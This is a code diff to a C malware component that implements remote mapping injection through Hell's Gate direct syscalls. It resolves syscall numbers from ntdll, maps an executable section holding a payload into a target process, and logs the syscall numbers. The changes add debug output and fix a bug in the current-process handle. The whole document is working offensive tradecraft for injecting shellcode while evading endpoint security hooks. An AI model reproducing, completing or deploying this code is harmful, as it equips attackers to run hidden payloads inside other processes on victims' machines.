@@ -4,6 +4,8 @@
 VX_TABLE g_SyscallsTable = { 0 };
 
 BOOL InitializeSyscalls() {
+	printf("[i] Initializing Syscalls Table...\n");
+
 	// Get the PEB
 	PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
 	PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
@@ -42,22 +44,27 @@ BOOL InitializeSyscalls() {
 	if (!GetVxTableEntry(ntDllBaseAddress, pImageExportDirectory, &g_SyscallsTable.NtWaitForSingleObject))
 		return FALSE;
 
+	printf("[+] DONE!\n");
+	printf("[+] SSN Of The NtCreateSection: %d\n", g_SyscallsTable.NtCreateSection.wSystemCall);
+	printf("[+] SSN Of The NtMapViewOfSection: %d\n", g_SyscallsTable.NtMapViewOfSection.wSystemCall);
+	printf("[+] SSN Of The NtUnmapViewOfSection: %d\n", g_SyscallsTable.NtUnmapViewOfSection.wSystemCall);
+	printf("[+] SSN Of The NtClose: %d\n", g_SyscallsTable.NtClose.wSystemCall);
+	printf("[+] SSN Of The NtCreateThreadEx: %d\n", g_SyscallsTable.NtCreateThreadEx.wSystemCall);
+	printf("[+] SSN Of The NtWaitForSingleObject: %d\n", g_SyscallsTable.NtWaitForSingleObject.wSystemCall);
+
 	return TRUE;
 }
 
 BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN SIZE_T sPayloadSize, IN BOOL bIsLocalInjection) {
-	// Declare local vars
+	// Init local vars
 	NTSTATUS		status = 0x0;
 	HANDLE          hSection = NULL, hThread = NULL;
 	PVOID			pAllocatedAddress = NULL;
 	PVOID			pAllocatedRemoteAddress = NULL;
 	PVOID			pExecAddress = NULL;
-	LARGE_INTEGER	liMaxSize = { 0 };
+	LARGE_INTEGER	liMaxSize = { .LowPart = sPayloadSize };
 	SIZE_T          sViewSize = 0;
 	DWORD           dwLocalFlag = bIsLocalInjection ? PAGE_EXECUTE_READWRITE : PAGE_READWRITE;
-
-	// Init local vars
-	liMaxSize.LowPart = (DWORD)sPayloadSize;
 
 	// Allocating local map view 
 	HellsGate(g_SyscallsTable.NtCreateSection.wSystemCall);
@@ -69,7 +76,7 @@ BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN
 		PAGE_EXECUTE_READWRITE,
 		SEC_COMMIT,
 		NULL
-	) != 0x0) {
+	) != 0) {
 		printf("[!] NtCreateSection Failed With Error : 0x%0.8X \n", status);
 		return FALSE;
 	}
@@ -77,14 +84,14 @@ BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN
 	HellsGate(g_SyscallsTable.NtMapViewOfSection.wSystemCall);
 	if (status = HellDescent(
 		hSection,
-		GetCurrentThreadHandle(),
+		GetCurrentProcessHandle(),
 		&pAllocatedAddress,
 		NULL, NULL, NULL,
 		&sViewSize,
 		ViewShare,
 		NULL,
 		dwLocalFlag
-	) != 0x0) {
+	) != 0) {
 		printf("[!] NtMapViewOfSection [L] Failed With Error : 0x%0.8X \n", status);
 		return FALSE;
 	}
